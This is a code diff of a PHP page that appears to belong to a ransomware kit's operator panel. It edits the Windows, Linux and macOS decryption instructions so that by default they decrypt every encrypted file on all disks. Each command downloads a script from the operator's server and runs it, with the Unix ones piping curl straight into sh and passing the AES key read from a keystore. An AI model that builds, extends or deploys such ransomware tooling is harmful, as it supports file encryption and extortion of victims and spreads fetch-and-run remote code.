@@ -19,27 +19,28 @@ $aes_pwd = is_file($ks_path) ? trim(file_get_contents($ks_path)) : 'KEY_NOT_SET'
 <pre class="dt-code">:: 纯 PowerShell 实现，无需编译 exe
 :: 要求 PowerShell 7+   (未装可执行: winget install Microsoft.PowerShell)
 curl.exe -sL <?=$srv?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
-pwsh -File jasmin_unlock.ps1 -Server <?=$srv?> -K "<?=$aes_pwd?>" -Paths C:\path\to\decrypt
-:: -Paths 换成要解密的目录；不写则解密当前目录</pre>
+pwsh -File jasmin_unlock.ps1 -Server <?=$srv?> -K "<?=$aes_pwd?>"
+:: 不写 -Paths 则解密全部加密文件（所有磁盘 + 常用用户目录）
+:: 也可只解指定目录：-Paths C:\data D:\work</pre>
 </div>
 
 <div class="dt-content" id="dt-linux" style="display:none">
 <h3>🐧 Linux 一键解密</h3>
 <pre class="dt-code"># Linux 一键解密 — 纯 openssl，零依赖（无需 pip / cryptography）
-# 末尾加上要解密的目录；不写则解密当前目录
-curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /path/to/decrypt
+# 不写目录则解密全部加密文件（/home /root /var /opt /tmp /srv + 所有真实挂载点）
+curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"
 
-# 例：解密 /data 与 /home
+# 只需解特定目录时，在末尾追加（可多个）
 curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /data /home</pre>
 </div>
 
 <div class="dt-content" id="dt-mac" style="display:none">
 <h3>🍎 macOS 一键解密</h3>
 <pre class="dt-code"># macOS 一键解密 — 纯 openssl，零依赖（macOS 自带 openssl，无需安装任何东西）
-# 末尾加上要解密的目录；不写则解密当前目录
-curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /path/to/decrypt
+# 不写目录则解密全部加密文件（/home /root /var /opt /tmp /srv + 所有真实挂载点）
+curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"
 
-# 例：解密 /Users 与 /tmp
+# 只需解特定目录时，在末尾追加（可多个）
 curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /Users /tmp</pre>
 </div>
 
